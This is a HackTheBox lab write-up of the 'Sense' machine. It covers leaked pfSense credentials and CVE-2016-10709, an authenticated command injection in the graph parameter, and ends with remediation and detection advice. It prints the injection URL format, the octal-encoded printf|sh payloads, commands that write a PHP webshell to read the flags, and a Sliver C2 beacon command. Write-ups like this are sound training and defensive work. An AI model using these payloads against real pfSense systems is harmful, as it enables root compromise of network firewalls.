---
layout: default
title: "HackTheBox - Sense"
---

# HackTheBox - Sense

**OS:** FreeBSD 10.1 (pfSense 2.1.3)

Sense is a FreeBSD box exposing a pfSense firewall administration panel on HTTPS. A credential
file left on the web server -- surfaced only with a wordlist that contains it -- reveals a
user account with the default pfSense password. Authenticated access to pfSense 2.1.3 gives
access to CVE-2016-10709, a command injection in `status_rrd_graph_img.php` via the `graph`
parameter that uses pipe-chained `printf`/octal encoding to bypass the character filter. The
web process runs as root; no privilege escalation is required. Sliver C2 does not support
FreeBSD as a target OS; flags were collected through a PHP webshell written to the web root
via the injection.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` |
| Initial Access | Credential disclosure in `system-users.txt` (`rohit:pfsense`) |
| Exploitation | CVE-2016-10709 -- `graph` parameter pipe/octal injection, root execution |
| C2 | None -- Sliver 1.7.3 does not support FreeBSD |
| Flag Collection | PHP webshell written to web root via injection |
| Final Access | `root` (web process privilege) |

---

## Recon

### Port Scan

Quick TCP scan identified two ports: HTTP on 80 (redirects to HTTPS) and pfSense HTTPS on 443.

| Port | Proto | Service | Version |
|---|---|---|---|
| 80 | TCP | HTTP | lighttpd (redirect to 443) |
| 443 | TCP | HTTPS | pfSense 2.1.3 (lighttpd) |

Port 80 returned an immediate 301 redirect to the HTTPS pfSense login page. Only two ports
-- no SSH, no other services. The entire attack surface is the pfSense web UI.

### Web Enumeration

Default credentials (`admin:pfsense`) failed. Directory fuzzing with a wordlist that includes
`system-users.txt` surfaced two text files:

```
GET /changelog.txt          200
GET /system-users.txt       200
```

> **Why the wordlist matters:** Most standard wordlists (dirbuster-medium, common.txt) do not
> include `system-users.txt`. The box is rated low on user difficulty because solvers who run
> only a single wordlist miss it entirely. Using SecLists `big.txt` or `raft-large-words.txt`
> finds it. This is a real-world pattern: credential files left on appliance web roots often
> have non-obvious names.

`changelog.txt` stated that two of three known vulnerabilities had been patched, confirming
an unpatched vulnerability remained in the running version.

`system-users.txt` disclosed:

```
###Support ticket###
Please create the following user

username: Rohit
password: company defaults
```

"Company defaults" for pfSense means the default installation password: `pfsense`.

Login with `rohit:pfsense` succeeded.

---

## Initial Access

### Credential Disclosure via `system-users.txt`

The credential file left on the web server provides direct access to the pfSense administration
panel. `rohit:pfsense` was used to authenticate:

```
attacker$ curl -sk -c /tmp/sense.cookies -X POST https://<target-ip>/index.php \
  -d '__csrf_magic=<token>&usernamefld=rohit&passwordfld=pfsense&login=Login'
```

Authentication returns an HTTP 302 redirect to the dashboard, confirming successful login.

> **Why this works:** pfSense ships with a default `admin:pfsense` credential and is a common
> target for default credential testing. Here rohit was provisioned with that same default
> password and the credential file was accidentally left in the web root, making it world-readable
> to anyone who can enumerate the server.

---

## Exploitation: CVE-2016-10709

### Command Injection via `graph` Parameter

pfSense 2.1.3 is vulnerable to authenticated remote command injection via the `graph` GET
parameter on `status_rrd_graph_img.php`. The PHP code concatenates the `graph` value into a
shell command without sanitization. The filter removes some special characters but NOT the
pipe (`|`) character. Payload delivery uses `printf` with octal-encoded shell commands piped
to `sh`, which:

1. Bypasses the character filter (only printable safe chars appear in the outer injection)
2. Places any redirect (`>`) and special chars inside the inner `sh` subprocess -- not the
   outer PHP-spawned shell -- avoiding SIGPIPE and filter issues

Injection format:

```
GET /status_rrd_graph_img.php?database=-throughput.rrd&graph=file|printf+'\<octal>'+|sh|echo
```

The inner command (octal-encoded) is decoded by `printf` and piped to `sh` for execution.

### Timing Confirmation

Sleep injection confirmed the path is live and runs synchronously:

```python
# Inner cmd: sleep 3
# graph param: file|printf '\163\154\145\145\160\40\63'|sh|echo
# Response delay: 3.8s -> confirmed RCE
```

### Flag Collection via PHP Webshell

Sliver C2 does not support FreeBSD as a target OS (see C2 section). Flags were read by
writing temporary PHP readers to the web root using the injection:

**Root flag:**
```python
inner_cmd = "echo '<?php echo file_get_contents(\"/root/root.txt\"); ?>' > /usr/local/www/r.php"
# Octal-encode and inject via graph parameter
# Then: GET /r.php -> <root-flag-redacted>
```

**User flag:**
```python
inner_cmd = "echo '<?php echo file_get_contents(\"/home/rohit/user.txt\"); ?>' > /usr/local/www/u.php"
# Then: GET /u.php -> <user-flag-redacted>
```

Both PHP files were removed after flag collection:

```python
inner_cmd = "rm -f /usr/local/www/r.php /usr/local/www/u.php"
```

Verification: `GET /r.php` and `GET /u.php` both returned 404.

> **Why this works:** The pfSense web process runs as `root` -- confirmed by the ability to
> read `/root/root.txt` directly. Writing to `/usr/local/www/` requires root. The PHP file,
> once placed in the web root, is executed by the already-running web server on the next
> HTTP request.

> **Why octal encoding is necessary:** The `graph` parameter goes through a character filter
> before being concatenated into the shell command. The filter strips characters like `>`, `<`,
> `$`, and others. By octal-encoding the entire inner shell script and using `printf '...' | sh`
> as the delivery vehicle, the outer injection contains only safe characters (digits, backslashes,
> pipe, letters). The `>` redirect and all special chars live inside the octal payload, decoded
> by `printf` and interpreted by the inner `sh`.

---

## Post-Access: C2 (Sliver)

Sliver implant delivery was not possible on this target.

```
sliver > generate beacon --https <attack-ip>:443 --os freebsd --arch amd64 --name sense-beacon --format EXECUTABLE --save /tmp/

Error: os must be one of ['darwin', 'linux', 'windows']
```

Sliver 1.7.3 does not support FreeBSD as a target OS -- the generation step fails outright. No beacon was compiled, deployed, or checked in. All post-access operations were conducted through the PHP webshell approach described above.

---

## Root Cause

Two issues combined:

1. **Credential file left in web root.** `system-users.txt` was created during provisioning
   and not removed. It disclosed a valid username and pointed to the default password. Any
   wordlist that includes the filename reaches authenticated access without any brute force.

2. **Unpatched CVE-2016-10709.** pfSense 2.1.3 does not sanitize the `graph` parameter in
   `status_rrd_graph_img.php` before shell concatenation. The fix is input validation (or
   removal of the dynamic shell invocation). The `changelog.txt` on the same server confirmed
   the administrators were aware of the vulnerability class but left one unpatched.

The web process running as `root` is a design decision in pfSense that turns any web-layer
RCE directly into full system access, eliminating any privilege boundary.

---

## Impact

Full root on the firewall host. An attacker with root on the firewall can:

- Read, modify, or delete all firewall rules (disable protection for the entire LAN)
- Intercept and inspect all traffic passing through the device
- Pivot to internal network segments not otherwise reachable
- Access VPN credentials and PKI material stored on the firewall
- Persist through configuration backups (pfSense backup/restore)

The impact radius is the entire network the firewall protects.

---

## Remediation

- **Remove credential and configuration files from the web root.** After provisioning, audit
  `/usr/local/www/` for any `.txt`, `.bak`, or support-ticket files.
- **Upgrade pfSense to a version that patches CVE-2016-10709.** The fix was released in 2.3+.
  On an internet-exposed firewall, an unpatched CVE with a public exploit is critical priority.
- **Restrict the pfSense web UI to management-only networks.** The login page should not be
  reachable from untrusted interfaces. Place the management interface on a dedicated VLAN with
  access controls, or use pfSense's lockout rules.
- **Change default credentials on all provisioned accounts.** "Company defaults" is not a
  password. Enforce a minimum password policy and rotate credentials after provisioning.

### Validation

Confirm remediation by:
- Verifying `GET /system-users.txt` returns 404
- Verifying `rohit:pfsense` login is rejected
- Verifying the `graph` parameter injection (`sleep 5` timing test) does not produce a delay
- Verifying the pfSense UI is not reachable from WAN interfaces

---

## Detection Opportunities

- **Alert on GET requests to `.txt` files in the pfSense web root.** No legitimate pfSense
  operation fetches `system-users.txt` or `changelog.txt` during normal use.
- **Alert on authentication attempts with the default password `pfsense`.** Log all login
  attempts and flag the use of known-default credentials.
- **Monitor `/status_rrd_graph_img.php` requests with pipe characters in the `graph`
  parameter.** The octal-encoded payload is distinctive -- `\` followed by three digits,
  repeated -- and can be matched with a regex in web server logs.
- **Alert on new PHP files appearing in `/usr/local/www/`.** The web root is static between
  pfSense upgrades. Any new `.php` file is anomalous.
- **Monitor for unusual child processes spawned by the web server** (lighttpd spawning `sh`,
  `printf`, or `php` as direct children). pfSense's normal operation does not spawn arbitrary
  shells.

---

## Lessons Learned

- **Wordlist coverage is enumeration completeness.** A single wordlist run is not exhaustive
  coverage. Running multiple lists (or a merged superset) is necessary to avoid missing
  files like `system-users.txt` that real administrators leave behind.
- **The correct injection parameter matters.** Initial attempts used the `database` parameter
  with semicolons (CVE-2014-4688 reference). The actual vulnerability is CVE-2016-10709 via
  the `graph` parameter with pipes. Both cause delays via timing, but only the `graph`/octal
  path can write files and produces root-level execution. Always read the MSF module source
  or the original advisory to understand the exact injection point and encoding.
- **Sliver does not support FreeBSD.** When the initial access host is FreeBSD, Sliver cannot
  deliver a beacon. The fallback for flag collection is a PHP webshell written directly to the
  web root via the same injection. Capture this as a stack gap.
- **The web server running as root eliminates privilege escalation.** pfSense intentionally
  runs its web process as root. On any pfSense box, achieving web-layer RCE means immediate
  root access with no secondary escalation required.

---

## Cleanup

```
[injection]  rm -f /usr/local/www/r.php /usr/local/www/u.php
[verify]     GET /r.php -> 404, GET /u.php -> 404
[htb]        flags submitted, machine stopped (htb stop)
```

- PHP flag-reader files removed from web root and verified 404.
- No implant established (FreeBSD -- Sliver not supported).
- No local listeners or background processes started.
- HTB machine stopped after flags submitted.
